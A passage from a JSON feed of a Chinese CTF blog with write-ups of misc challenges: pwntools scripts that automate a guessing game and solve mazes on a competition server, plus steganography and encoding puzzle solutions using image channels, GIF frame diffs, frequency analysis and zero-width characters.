class=\"number\">0</span></span><br><span class=\"line\">q = sh.recvuntil(<span class=\"string\">&#x27;:&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    <span class=\"keyword\">if</span> i==<span class=\"number\">66</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> tag==<span class=\"number\">0</span>:</span><br><span class=\"line\">        sh.send(<span class=\"string\">&#x27;r&#x27;</span>)</span><br><span class=\"line\">        q=sh.recvuntil(<span class=\"string\">&#x27;:&#x27;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(q)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">b&#x27;again&#x27;</span>  <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> q:</span><br><span class=\"line\">            i+=<span class=\"number\">1</span>;s.append(<span class=\"string\">&#x27;r&#x27;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span> :</span><br><span class=\"line\">             sh.send(<span class=\"string\">&#x27;y&#x27;</span>)</span><br><span class=\"line\">             <span class=\"keyword\">for</span> m <span class=\"keyword\">in</span> s:</span><br><span class=\"line\">                 sh.recvuntil(<span class=\"string\">&#x27;:&#x27;</span>)</span><br><span class=\"line\">                 sh.send(m)</span><br><span class=\"line\">             sh.recvuntil(<span class=\"string\">&#x27;:&#x27;</span>)  <span class=\"comment\">#</span></span><br><span class=\"line\">             tag = <span class=\"number\">1</span></span><br><span class=\"line\">             <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">elif</span> tag==<span class=\"number\">1</span>:</span><br><span class=\"line\">        sh.send(<span class=\"string\">&#x27;b&#x27;</span>)</span><br><span class=\"line\">        q=sh.recvuntil(<span class=\"string\">&#x27;:&#x27;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(q)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">b&#x27;again&#x27;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> q:</span><br><span class=\"line\">            i += <span class=\"number\">1</span>;s.append(<span class=\"string\">&#x27;b&#x27;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">              sh.send(<span class=\"string\">&#x27;y&#x27;</span>)</span><br><span class=\"line\">              <span class=\"keyword\">for</span> m <span class=\"keyword\">in</span> s:</span><br><span class=\"line\">                  sh.recvuntil(<span class=\"string\">&#x27;:&#x27;</span>)</span><br><span class=\"line\">                  sh.send(m)</span><br><span class=\"line\">              sh.recvuntil(<span class=\"string\">&#x27;:&#x27;</span>)<span class=\"comment\">#</span></span><br><span class=\"line\">              tag = <span class=\"number\">0</span></span><br><span class=\"line\">              <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(i)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure><br />\n 代码稍微有点小问题，第 66 轮直接跳出来了，懒得改了。。。<br />\n就随便猜一下然后就可以拿到 flag。</p>\n<hr />\n<h2 id=\"misc-funny_maze\"><a class=\"anchor\" href=\"#misc-funny_maze\">#</a> Misc-funny_maze</h2>\n<p>跟前面那题<br />\n差不多的思路，就是典型的迷宫问题多搞几次就能出来 flag.</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">dirs=[(<span class=\"number\">0</span>,<span class=\"number\">1</span>),(<span class=\"number\">1</span>,<span class=\"number\">0</span>),(<span class=\"number\">0</span>,-<span class=\"number\">1</span>),(-<span class=\"number\">1</span>,<span class=\"number\">0</span>)] <span class=\"comment\">#当前位置四个方向的偏移量</span></span><br><span class=\"line\">path=[]              <span class=\"comment\">#存找到的路径</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">mark</span>(<span class=\"params\">maze,pos</span>):  <span class=\"comment\">#给迷宫maze的位置pos标&quot;2&quot;表示“到过了”</span></span><br><span class=\"line\">    maze[pos[<span class=\"number\">0</span>]][pos[<span class=\"number\">1</span>]]=<span class=\"number\">2</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">passable</span>(<span class=\"params\">maze,pos</span>): <span class=\"comment\">#检查迷宫maze的位置pos是否可通行</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> maze[pos[<span class=\"number\">0</span>]][pos[<span class=\"number\">1</span>]]==<span class=\"number\">0</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">find_path</span>(<span class=\"params\">maze,pos,end</span>):</span><br><span class=\"line\">    mark(maze,pos)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> pos==end:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(pos,end=<span class=\"string\">&quot; &quot;</span>)  <span class=\"comment\">#已到达出口，输出这个位置。成功结束</span></span><br><span class=\"line\">        path.append(pos)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">4</span>):      <span class=\"comment\">#否则按四个方向顺序检查</span></span><br><span class=\"line\">        nextp=pos[<span class=\"number\">0</span>]+dirs[i][<span class=\"number\">0</span>],pos[<span class=\"number\">1</span>]+dirs[i][<span class=\"number\">1</span>]</span><br><span class=\"line\">        <span class=\"comment\">#考虑下一个可能方向</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> passable(maze,nextp):        <span class=\"comment\">#不可行的相邻位置不管</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> find_path(maze,nextp,end):<span class=\"comment\">#如果从nextp可达出口，输出这个位置，成功结束</span></span><br><span class=\"line\">                <span class=\"built_in\">print</span>(pos,end=<span class=\"string\">&quot; &quot;</span>)</span><br><span class=\"line\">                path.append(pos)</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">see_path</span>(<span class=\"params\">maze,path,leng</span>):     <span class=\"comment\">#使寻找到的路径可视化</span></span><br><span class=\"line\">    length = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i,p <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(path):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> i==<span class=\"number\">0</span>:</span><br><span class=\"line\">            maze[p[<span class=\"number\">0</span>]][p[<span class=\"number\">1</span>]] =<span class=\"string\">&quot;E&quot;</span></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> i==<span class=\"built_in\">len</span>(path)-<span class=\"number\">1</span>:</span><br><span class=\"line\">            maze[p[<span class=\"number\">0</span>]][p[<span class=\"number\">1</span>]]=<span class=\"string\">&quot;S&quot;</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            maze[p[<span class=\"number\">0</span>]][p[<span class=\"number\">1</span>]] =<span class=\"number\">3</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> r <span class=\"keyword\">in</span> maze:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> r:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> c==<span class=\"number\">3</span>:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;\\033[0;31m&#x27;</span>+<span class=\"string\">&quot;*&quot;</span>+<span class=\"string\">&quot; &quot;</span>+<span class=\"string\">&#x27;\\033[0m&#x27;</span>,end=<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">                length+=<span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">elif</span> c==<span class=\"string\">&quot;S&quot;</span> <span class=\"keyword\">or</span> c==<span class=\"string\">&quot;E&quot;</span>:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;\\033[0;34m&#x27;</span>+c+<span class=\"string\">&quot; &quot;</span> + <span class=\"string\">&#x27;\\033[0m&#x27;</span>, end=<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">elif</span> c==<span class=\"number\">2</span>:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;\\033[0;32m&#x27;</span>+<span class=\"string\">&quot;#&quot;</span>+<span class=\"string\">&quot; &quot;</span>+<span class=\"string\">&#x27;\\033[0m&#x27;</span>,end=<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">elif</span> c==<span class=\"number\">1</span>:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;\\033[0;;40m&#x27;</span>+<span class=\"string\">&quot; &quot;</span>*<span class=\"number\">2</span>+<span class=\"string\">&#x27;\\033[0m&#x27;</span>,end=<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">&quot; &quot;</span>*<span class=\"number\">2</span>,end=<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>()</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(length+<span class=\"number\">1</span>)</span><br><span class=\"line\">    leng=length+<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> leng</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">maze_change</span>(<span class=\"params\">num</span>):</span><br><span class=\"line\">    MAZE=[]</span><br><span class=\"line\">    row=col=<span class=\"number\">0</span></span><br><span class=\"line\">    M=<span class=\"built_in\">str</span>(sh.recvuntil(<span class=\"string\">&quot;P&quot;</span>))</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(M)</span><br><span class=\"line\">    MAZE.append([])</span><br><span class=\"line\">    <span class=\"keyword\">for</span> m <span class=\"keyword\">in</span> M:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> col == num:</span><br><span class=\"line\">            MAZE.append([])</span><br><span class=\"line\">            row+=<span class=\"number\">1</span></span><br><span class=\"line\">            col=<span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> m == <span class=\"string\">&#x27;\\n&#x27;</span>:</span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> m == <span class=\"string\">&#x27;#&#x27;</span>:</span><br><span class=\"line\">            MAZE[row].append(<span class=\"number\">1</span>)</span><br><span class=\"line\">            col+=<span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> m == <span class=\"string\">&#x27; &#x27;</span>:</span><br><span class=\"line\">            MAZE[row].append(<span class=\"number\">0</span>)</span><br><span class=\"line\">            col+=<span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> m == <span class=\"string\">&#x27;S&#x27;</span>:</span><br><span class=\"line\">            MAZE[row].append(<span class=\"number\">0</span>)</span><br><span class=\"line\">            start=(row,col)</span><br><span class=\"line\">            col+=<span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> m ==<span class=\"string\">&#x27;E&#x27;</span>:</span><br><span class=\"line\">            MAZE[row].append(<span class=\"number\">0</span>)</span><br><span class=\"line\">            end=(row,col)</span><br><span class=\"line\">            col+=<span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> m ==<span class=\"string\">&#x27;P&#x27;</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(MAZE)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> MAZE, start, end</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">gets</span>(<span class=\"params\">num</span>):</span><br><span class=\"line\">    maze=[]</span><br><span class=\"line\">    start=(<span class=\"number\">0</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">    end=(<span class=\"number\">0</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">    maze,start,end=maze_change(num)</span><br><span class=\"line\">    find_path(maze,start,end)</span><br><span class=\"line\">    leng=<span class=\"number\">0</span></span><br><span class=\"line\">    leng=see_path(maze,path,leng)</span><br><span class=\"line\">    sh.sendline(<span class=\"built_in\">str</span>(leng+<span class=\"number\">1</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">sh=remote(<span class=\"string\">&quot;node4.buuoj.cn&quot;</span>,<span class=\"number\">27512</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(sh.recvuntil(<span class=\"string\">b&#x27;game&#x27;</span>))</span><br><span class=\"line\">sh.sendline(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">gets(<span class=\"number\">11</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(sh.recvuntil(<span class=\"string\">b&#x27;level!&#x27;</span>))</span><br><span class=\"line\">dirs=[(<span class=\"number\">0</span>,<span class=\"number\">1</span>),(<span class=\"number\">1</span>,<span class=\"number\">0</span>),(<span class=\"number\">0</span>,-<span class=\"number\">1</span>),(-<span class=\"number\">1</span>,<span class=\"number\">0</span>)] <span class=\"comment\">#当前位置四个方向的偏移量</span></span><br><span class=\"line\">path=[]              <span class=\"comment\">#存找到的路径</span></span><br><span class=\"line\"></span><br><span class=\"line\">gets(<span class=\"number\">21</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(sh.recvuntil(<span class=\"string\">b&#x27;level!&#x27;</span>))</span><br><span class=\"line\">dirs=[(<span class=\"number\">0</span>,<span class=\"number\">1</span>),(<span class=\"number\">1</span>,<span class=\"number\">0</span>),(<span class=\"number\">0</span>,-<span class=\"number\">1</span>),(-<span class=\"number\">1</span>,<span class=\"number\">0</span>)] <span class=\"comment\">#当前位置四个方向的偏移量</span></span><br><span class=\"line\">path=[]              <span class=\"comment\">#存找到的路径</span></span><br><span class=\"line\"></span><br><span class=\"line\">gets(<span class=\"number\">31</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(sh.recvuntil(<span class=\"string\">b&#x27;level!&#x27;</span>))</span><br><span class=\"line\">dirs=[(<span class=\"number\">0</span>,<span class=\"number\">1</span>),(<span class=\"number\">1</span>,<span class=\"number\">0</span>),(<span class=\"number\">0</span>,-<span class=\"number\">1</span>),(-<span class=\"number\">1</span>,<span class=\"number\">0</span>)] <span class=\"comment\">#当前位置四个方向的偏移量</span></span><br><span class=\"line\">path=[]              <span class=\"comment\">#存找到的路径</span></span><br><span class=\"line\"></span><br><span class=\"line\">gets(<span class=\"number\">101</span>)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure><br />\n 其中迷宫问题的部分代码是从<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5NjgxNzc3L2FydGljbGUvZGV0YWlscy84MzcxOTY4MA==\">这里</span>复制来的<br />\n值得注意的是多次循环，变量初始化的问题，我排查了好久 (￣_￣|||)<br />\n 一开始没有注意到这个问题，还以为是我哪个顺序出错了，后来才发现。</p>\n<hr />\n<h2 id=\"misc-ezsteganography\"><a class=\"anchor\" href=\"#misc-ezsteganography\">#</a> Misc-ezSteganography</h2>\n<p>比赛时只解出前半个，记录一下比赛时的错误思路\t(。﹏。)：<br />\n（<s>根据第二个提示，后半大概率是 Green 通道里的图片藏了啥信息，然而第一个提示里的 QIM quantization 估计是加密方法，然后，我们就纠在 QIM 是啥的问题上了。。。</s> ）</p>\n<p>然而实际上只要把 g0 和 g1 通道的两张图异或一下就可以了，就用 stegsolve 里的 Image Combiner 的功能</p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/nonesycamore/sycamore_cdn/wp-content/uploads/2021/09/post-187-613781a296735.png\" alt=\"前半flag加第一条提示\" /></p>\n<p>前半 flag 加第一条提示 ↑</p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/nonesycamore/whitzard_cdn/wp-content/uploads/2021/09/post-187-613781a30a77f.png\" alt=\"第二条提示\" /></p>\n<p>第二条提示 ↑</p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/nonesycamore/whitzard_cdn/wp-content/uploads/2021/09/post-187-613781a410b63.png\" alt=\"后半个flag\" /></p>\n<p>后半个 flag ↑</p>\n<hr />\n<h2 id=\"misc-just-a-gif\"><a class=\"anchor\" href=\"#misc-just-a-gif\">#</a> Misc-Just a GIF</h2>\n<p>『赛后复现』和国赛<span class=\"exturl\" data-url=\"aHR0cHM6Ly9tb2NodS5ibG9nLmNzZG4ubmV0L2FydGljbGUvZGV0YWlscy8xMTY4NTUyNDI=\"> running_pixel</span> 的题基本是一个思路，gif 分离出 451 张图，分为 41 组，每组 11 张图。<br />\n然后每组的第 i 张和第一组的第 i 张作比较，不一样的画黑，就可以了。<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> PIL <span class=\"keyword\">import</span> Image</span><br><span class=\"line\"></span><br><span class=\"line\">path = <span class=\"string\">&quot;Just_a_GIF/&quot;</span>  <span class=\"comment\">#填自己的路径</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">11</span>):</span><br><span class=\"line\">    picn = Image.new(<span class=\"string\">&quot;RGB&quot;</span>,(<span class=\"number\">119</span>,<span class=\"number\">83</span>),(<span class=\"number\">255</span>,<span class=\"number\">255</span>,<span class=\"number\">255</span>))</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">41</span>):</span><br><span class=\"line\">        p1=Image.<span class=\"built_in\">open</span>(path+<span class=\"built_in\">str</span>(i)+<span class=\"string\">&#x27;.png&#x27;</span>)</span><br><span class=\"line\">        p2=Image.<span class=\"built_in\">open</span>(path+<span class=\"built_in\">str</span>(i+j*<span class=\"number\">11</span>)+<span class=\"string\">&#x27;.png&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">for</span> w <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">119</span>):</span><br><span class=\"line\">            <span class=\"keyword\">for</span> h <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">83</span>):</span><br><span class=\"line\">                <span class=\"keyword\">if</span> p1.getpixel((w,h)) != p2.getpixel((w,h)):</span><br><span class=\"line\">                    picn.putpixel((w,h),(<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>))</span><br><span class=\"line\">    picn.save(<span class=\"built_in\">str</span>(i)+<span class=\"string\">&#x27;.png&#x27;</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><br />\n 然后就拿到 11 张图片 ↓<br />\n<img data-src=\"https://cdn.jsdelivr.net/gh/nonesycamore/whitzard_cdn/wp-content/uploads/2021/09/post-187-613781a48b444.png\" alt=\"请添加图片描述\" /></p>\n<p>手动拼接？\t↓<br />\n<img data-src=\"https://cdn.jsdelivr.net/gh/nonesycamore/whitzard_cdn/wp-content/uploads/2021/09/post-187-613781a4d72e5.png\" alt=\"请添加图片描述\" /></p>\n<p>网上搜一下，貌似是 DataMatrix，扫出 flag</p>\n<blockquote 6bb73086aeb764b5727529d82b084cce=\"\">\n<p>DASCTF</p>\n</blockquote>\n<hr />\n<h2 id=\"misc-nuclear-wastewater\"><a class=\"anchor\" href=\"#misc-nuclear-wastewater\">#</a> Misc-Nuclear wastewater</h2>\n<p>『赛后复现』彩色的二维码，比赛最后经队友提示，看了看它 RGB 才有了思路。<br />\n所有的色块竟然都是，三个通道两个为 0，剩一个有值，那肯定密码就藏在这里了。<br />\n写个脚本把数字转出来<br />\n <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> PIL <span class=\"keyword\">import</span> Image</span><br><span class=\"line\">img = Image.<span class=\"built_in\">open</span>(<span class=\"string\">&quot;Nuclear wastewater.png&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">3</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"number\">230</span>,<span class=\"number\">10</span>):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> t <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"number\">230</span>,<span class=\"number\">10</span>):</span><br><span class=\"line\">            rgb=<span class=\"built_in\">list</span>(img.getpixel((t,j)))</span><br><span class=\"line\">            <span class=\"keyword\">if</span> rgb[i]&gt;<span class=\"number\">32</span> <span class=\"keyword\">and</span> rgb[i]&lt;<span class=\"number\">128</span>:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"built_in\">chr</span>(rgb[i]),end=<span class=\"string\">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><br />\n 得到这个</p>\n<blockquote>\n<p>Ys&gt;UEJht#?ppeEFtstR#<sub>:hi</sub>tR:@s@YRteK#e@KsR&amp;E&amp;:eR:Eht/#iKtteYKhYKYhhhihhKtC2tt:HVEesY&amp;#@Rj!seRi:eitEtKsetKtEE:hh#h#eYKYihhYK(Kt@iSY$KY/@pRsEetsip:~h@eeEs!E&amp;&amp;::EsEEei#/iYe#/ieKKt//iKYhh</p>\n</blockquote>\n<p>发现很多重复的字符，想到使用词频分析看一下<br />\n <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> collections <span class=\"keyword\">import</span> Counter</span><br><span class=\"line\">f = <span class=\"string\">&#x27;Ys&gt;UEJht#?ppeEFtstR#~:hi~tR:@s@YRteK#e@KsR&amp;E&amp;:eR:Eht/#iKtteYKhYKYhhhihhKtC2tt:HVEesY&amp;#@Rj!seRi:eitEtKsetKtEE:hh#h#eYKYihhYK(Kt@iSY$KY/@pRsEetsip:~h@eeEs!E&amp;&amp;::EsEEei#/iYe#/ieKKt//iKYhh&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(Counter(f))</span><br></pre></td></tr></table></figure><br />\n<img data-src=\"https://cdn.jsdelivr.net/gh/nonesycamore/whitzard_cdn/wp-content/uploads/2021/09/post-187-613781a570599.png\" alt=\"请添加图片描述\" /></p>\n<p>得到： <code>theKEYis:#R@/&amp;p~!&gt;UJ?FC2HVj(S$</code> <br />\n 初步尝试，发现这个不太对，密码错误。。。<br />\n瞻仰一波套神的 wp 之后，原来  <code>&gt;UJ?FC2HVj(S$</code>  词频为 1，所以顺序可能出错，推测词频为 1 的部分不是密码，<br />\n所以得到密码：</p>\n<blockquote>\n<p>'#R@/&amp;p~!'</p>\n</blockquote>\n<p>解压得到 flag.txt....\t(T_T)<br />\n 果然我还是太天真了，还以为能直接拿到 flag...<br />\n 瞅瞅内码，然后看到了这个：</p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/nonesycamore/whitzard_cdn/wp-content/uploads/2021/09/post-187-613781a60a7f6.png\" alt=\"请添加图片描述\" /></p>\n<p>哦吼，还有个零宽？<br />\n包含 U+200C U+200D U+200E，<span class=\"exturl\" data-url=\"aHR0cHM6Ly8zMzBrLmdpdGh1Yi5pby9taXNjX3Rvb2xzL3VuaWNvZGVfc3RlZ2Fub2dyYXBoeS5odG1s\">网址</span><br />\n隐藏内容是：</p>\n<blockquote>\n<p>2021 年 4 月 13 日，核废水在 Citrix 县的 CTX1 市尤为严重</p>\n</blockquote>\n<p>好吧，完全不知道....(；′⌒`)<br />\n 搜了一下 Citrix CTX1，大概是某种加密，<br />\n终归还是了解的太少了<br />\n<img data-src=\"https://cdn.jsdelivr.net/gh/nonesycamore/whitzard_cdn/wp-content/uploads/2021/09/post-187-613781a6921a9.png\" alt=\"请添加图片描述\" /></p>\n<p>emm... 搜索发现 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9nY2hxLmdpdGh1Yi5pby9DeWJlckNoZWYv\">CyberChef</span> 可以进行解密\t§(<em>￣▽￣</em>)§<br />\n 解两次得到 flag：</p>\n<blockquote 98047de9ce5aaa4c0031fb55e9dfac70=\"\">\n<p>flag</p>\n</blockquote>\n<hr />\n<p>到这里，misc 就结束啦！ (oﾟvﾟ) ノ</p>\n",
            "tags": [
                "Python",
                "CTF",
                "Misc"
            ]
        },
        {
            "id": "https://www.sycamore.top/CyberSecurity/CTF/CUMT-PWN%E4%B8%93%E9%A1%B9/",
            "url": "https://www.sycamore.top/CyberSecurity/CTF/CUMT-PWN%E4%B8%93%E9%A1%B9/",
            "title": "CUMT PWN专项",
            "date_published": "2021-11-25T15:24:22.000Z",
